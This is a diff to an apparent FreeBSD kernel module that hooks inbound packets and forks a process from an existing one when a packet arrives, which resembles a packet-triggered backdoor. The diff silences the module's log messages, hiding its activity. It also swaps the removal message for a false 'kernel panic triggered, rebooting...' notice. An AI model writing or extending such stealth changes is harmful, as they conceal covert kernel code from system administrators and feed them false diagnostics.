@@ -184,13 +184,13 @@ static eventhandler_tag my_fork_tag;
 // registers custom func to kernel
 static void load_custom_fork_event_handler(void) {
     my_fork_tag = EVENTHANDLER_REGISTER(process_fork, my_fork_hook, NULL, EVENTHANDLER_PRI_ANY);
-    printf("[LKM] process_fork handler registered!\n");
+    // printf("[LKM] process_fork handler registered!\n");
 }
 // unregisters custom func to kernel
 static void unload_custom_fork_event_handler(void) {
     if (my_fork_tag != NULL) {
         EVENTHANDLER_DEREGISTER(process_fork, my_fork_tag);
-        printf("[LKM] process_fork handler unregistered!\n");
+        // printf("[LKM] process_fork handler unregistered!\n");
         my_fork_tag = NULL;
     }
 }
@@ -309,7 +309,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     // Fork from the found process
     error = fork1(parent_td, &fr);
     if (error) {
-        printf("[LKM] Fork failed: %d\n", error);
+        // printf("[LKM] Fork failed: %d\n", error);
         return PFIL_PASS;
     }
 
@@ -352,7 +352,7 @@ static int load_hook(void) {
         return (ENOMEM);
     }
 
-    printf("[LKM] Packet filter module loaded\n");
+    // printf("[LKM] Packet filter module loaded\n");
     return 0;
 }
 
@@ -371,7 +371,7 @@ static int load_link(void) {
         printf("[LKM] pfil_link failed: %d\n", err);
         return err;
     }
-    printf("[LKM] pfil_link success for inbound packets\n");
+    // printf("[LKM] pfil_link success for inbound packets\n");
     return 0;
 }
 
@@ -380,7 +380,7 @@ static void unload(void) {
     if (g_hook) {
         pfil_remove_hook(g_hook);
         g_hook = NULL;
-        printf("[LKM] pfil_hook removed\n");
+        printf("kernel panic triggered, rebooting...\n");
     }
     unload_custom_fork_event_handler();
 }
